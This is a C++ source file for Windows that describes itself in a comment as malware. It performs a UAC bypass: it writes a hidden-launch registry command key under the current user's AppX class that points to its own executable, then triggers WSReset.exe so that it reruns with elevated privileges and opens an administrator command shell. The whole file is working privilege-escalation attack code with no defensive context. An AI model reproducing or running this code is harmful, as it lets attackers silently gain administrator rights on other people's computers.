
#include <iostream>
#include <windows.h>

//IsProcessElevated() Function SOURCE: https://vimalshekar.github.io/codesamples/Checking-If-Admin
BOOL IsProcessElevated()
{
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		printf("\n Failed to get Process Token :%d.", GetLastError());
		goto Cleanup;  // if Failed, we treat as False
	}


	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
	{
		printf("\nFailed to get Token Information :%d.", GetLastError());
		goto Cleanup;// if Failed, we treat as False
	}

	fIsElevated = elevation.TokenIsElevated;

Cleanup:
	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}
	return fIsElevated;
}

std::string GetLastErrorAsString()
{
	//Get the error message, if any.
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0)
		return std::string(); //No error message has been recorded

	LPSTR messageBuffer = nullptr;
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

	std::string message(messageBuffer, size);

	//Free the buffer.
	LocalFree(messageBuffer);

	return message;
}




/* 
How it works.
Malware checks if it is elevated if so it does bad things.
If not set reg keys to enable uac bypass and run wsreset.exe
will rerun the malware with elevated privileges.

*/
int main()
{

	//Stops System32 redirecting to SysWOW64
	PVOID old;
	Wow64DisableWow64FsRedirection(&old);
	



	//check if we are already elevated
	if (IsProcessElevated())
	{
		//run elevated shell
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&si, sizeof(pi));
		CreateProcess(L"c:\\windows\\system32\\cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	}
	
	
	//SOURCE: https://www.activecyber.us/activelabs/windows-uac-bypass


	//if not set up UAC bypass
	else
	{
		//check if key exists

		HKEY hkey;
		LPCWSTR key = L"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command";
		wchar_t command[] = L"C:\\Windows\\System32\\cmd.exe /c start ";
		wchar_t path[MAX_PATH];
		wchar_t final[sizeof(command) + MAX_PATH] = L"";

		//get malware path
		GetModuleFileName(NULL, path, MAX_PATH);
		wcscat_s(final, command);
		wcscat_s(final, path);

		//create key
		RegCreateKeyEx(HKEY_CURRENT_USER, key, NULL, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
		
		//create values
		RegSetValueEx(hkey, NULL, NULL, REG_SZ, (LPBYTE)final, sizeof(final));
		RegSetValueEx(hkey, L"DelegateExecute", NULL, REG_SZ, NULL, 0);


		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&si, sizeof(pi));
		// set the size of the structure
		si.cb = sizeof(STARTUPINFO);
		// tell the application that we are setting the window display
		// information within this structure
		si.dwFlags = STARTF_USESHOWWINDOW;
		// set the window display to HIDE
		si.wShowWindow = SW_HIDE;

		wchar_t stuff[] = L"C:\\Windows\\System32\\cmd.exe /c start /min C:\\Windows\\System32\\WSReset.exe";

		
		if (CreateProcess(NULL , stuff, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
		{
			
			std::cout << "good";
			HWND window = FindWindow(NULL, L"C:\\Windows\\System32\\WSReset.exe");
			if (window)
			{
				ShowWindow(window, SW_HIDE);
			}
			{

			}

		}

		else {

			std::cout << GetLastErrorAsString();
		}
	

	}
}